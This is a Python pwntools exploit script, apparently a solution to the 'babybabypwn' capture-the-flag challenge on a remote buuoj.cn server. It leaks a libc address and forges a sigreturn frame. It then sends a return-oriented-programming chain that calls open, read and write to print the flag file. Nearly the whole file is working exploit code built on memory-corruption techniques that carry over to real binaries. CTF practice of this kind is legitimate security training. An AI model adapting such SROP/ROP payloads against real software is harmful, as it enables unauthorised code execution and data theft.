#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'vn_pwn_babybabypwn'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "node3.buuoj.cn"
remotePort = 28303

LOCAL = 0
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------


#--------------------------Exploit--------------------------
def exploit():
	li(rl())
	ru('0x')
	puts = int(r(12), 16)
	lib.address = puts - lib.sym['puts']
	li('libc base ' + hex(lib.address))
	# fake fream

	null = lib.address + 0x3c6500

	p  = p64(0) * 12
	p += p64(0) # rdi = rax
	p += p64(0) # rsi = rdi
	p += p64(0) # rbp
	p += p64(0) # rbx
	p += p64(null - 0x10) # rdx = rsi
	p += p64(0) # rax
	p += p64(0x100) # rcx = rdx
	p += p64(null) # rsp
	p += p64(lib.sym['syscall']) # rip
	p += p64(0) # cs : gs : fs
	p += p64(0x33)
	p += p64(0) * 7
	sa('message: ', p)

	'''
	0x0000000000021102 : pop rdi ; ret
	0x0000000000001b92 : pop rdx ; ret
	0x00000000000202e8 : pop rsi ; ret
	'''
	pop_rdi = lib.address + 0x21102
	pop_rdx = lib.address + 0x1b92
	pop_rsi = lib.address + 0x202e8

	p = './flag\x00\x00'
	p += p64(0)
	p += p64(pop_rdi) + p64(null - 0x10) # file
	p += p64(pop_rdx) + p64(0x0)
	p += p64(pop_rsi) + p64(0x0)
	p += p64(lib.sym['open'])
	# read
	p += p64(pop_rdi) + p64(0x3)
	p += p64(pop_rsi) + p64(null)
	p += p64(pop_rdx) + p64(0x30)
	p += p64(lib.sym['read'])
	# puts
	p += p64(pop_rdi) + p64(0x1)
	p += p64(pop_rsi) + p64(null)
	p += p64(pop_rdx) + p64(0x30)
	p += p64(lib.sym['write'])

	sl(p)


def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
